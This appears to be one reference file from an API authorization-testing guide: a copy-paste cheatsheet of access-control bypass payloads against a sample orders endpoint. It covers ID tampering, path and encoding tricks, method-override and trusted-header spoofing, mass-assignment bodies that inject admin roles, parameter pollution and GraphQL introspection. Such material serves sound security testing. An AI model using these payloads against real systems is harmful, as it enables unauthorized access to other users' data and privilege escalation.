# Reference 06 — Bypass Cheatsheet (quick lookup)

A condensed, copy-pasteable companion to the technique axis
(`references/05-test-matrix.md` §5c). Use it at the keyboard. Each entry is a
quick "try this" — the matrix reference explains *when* and *why*. Apply the
safety rules in `references/10-responsible-testing.md` for any write/delete.

Example target throughout: `GET /api/v2/orders/1001` owned by alice; attacker is
bob (should be denied).

## ID manipulation

```
/api/v2/orders/1000            # decrement
/api/v2/orders/1002            # increment
/api/v2/orders/0               # zero
/api/v2/orders/-1              # negative
/api/v2/orders/99999999        # far out of range
/api/v2/orders/1001            # a known-valid ID owned by a DIFFERENT identity
# sequential vs UUID: if you see both /orders/1001 and /orders/<uuid>, try the
# other scheme's value for a resource you shouldn't reach
```

## Encoding the id / path

```
%31%30%30%31                   # URL-encoded "1001"
%2531%2530%2530%2531           # double-URL-encoded
1001%00                        # null byte suffix
1001.json  1001;  1001%20      # trailing junk / extension
```

## Path tricks (on 401/403/404)

```
/api/v2/orders/1001/           # add trailing slash
/api/v2/Orders/1001            # case change
/api/v2/./orders/1001
/api/v2/orders/1001/..;/
/api//v2//orders//1001         # duplicate slashes
/%2e/api/v2/orders/1001
/api/v1/orders/1001            # older version, weaker checks
/internal/orders/1001          # alternate surface
/api/v2/orders/1001.json       # fake extension
```

## Method axis + override headers

```
GET → also try POST / PUT / PATCH / DELETE / OPTIONS

# front-end blocks the verb? layer an override on a permitted verb:
POST /api/v2/orders/1001
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: PUT
```

## Trusted-header spoofing

```
X-Original-URL: /admin/orders/1001
X-Rewrite-URL: /admin/orders/1001
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: internal.local
X-Forwarded-Scheme: https
Referer: https://app.example.com/admin
X-Admin: true
X-Debug: true
X-Internal: 1
# also: remove Authorization/Cookie but keep a "trusted" header above
```

## Mass assignment / body injection (writes)

```jsonc
// original body
{ "name": "My Order", "note": "x" }

// injected privilege / ownership fields — try individually and in combos
{ "name": "My Order", "role": "admin" }
{ "name": "My Order", "isAdmin": true }
{ "name": "My Order", "permissions": ["*"] }
{ "name": "My Order", "ownerId": "<alice>" }
{ "name": "My Order", "orgId": "<other-org>" }
{ "name": "My Order", "userId": "<other-user>" }
{ "name": "My Order", "plan": "enterprise" }
{ "name": "My Order", "verified": true, "status": "approved" }
```

## Parameter pollution

```
# query
?orderId=<mine>&orderId=<alice's>
?orderId=<alice's>&orderId=<mine>

# form body
orderId=<mine>&orderId=<alice's>

# JSON array form
{ "orderId": ["<mine>", "<alice's>"] }
```

## JSON structure / type tricks

```jsonc
{ "id": "1001" }               // string
{ "id": 1001 }                 // integer
{ "id": [1001] }               // array wrap
{ "id": { "value": 1001 } }    // nested object
{ "userId": 1001 }  { "userID": 1001 }  { "UserId": 1001 }  // casing
```

## GraphQL (see 07 for detail)

```graphql
# field-level authz: a resolver may not re-check what the parent query implies
# global-id IDOR
query { node(id: "<base64 of Order:1001 owned by alice>") { ... } }
# batching to slip past per-op checks / rate limits
[ {"query":"..."}, {"query":"..."} ]
# introspection to find admin-only fields/mutations worth targeting
{ __schema { types { name fields { name } } } }
```

## Reading the result

A technique "worked" only if a should-be-denied sender now gets the **known-good
shape with real target data** (or the write/delete demonstrably took effect) —
not a 200 wrapping an error, an empty object, or a generic not-found. Push every
such candidate through `references/08-confirmation.md` before calling it a
finding.
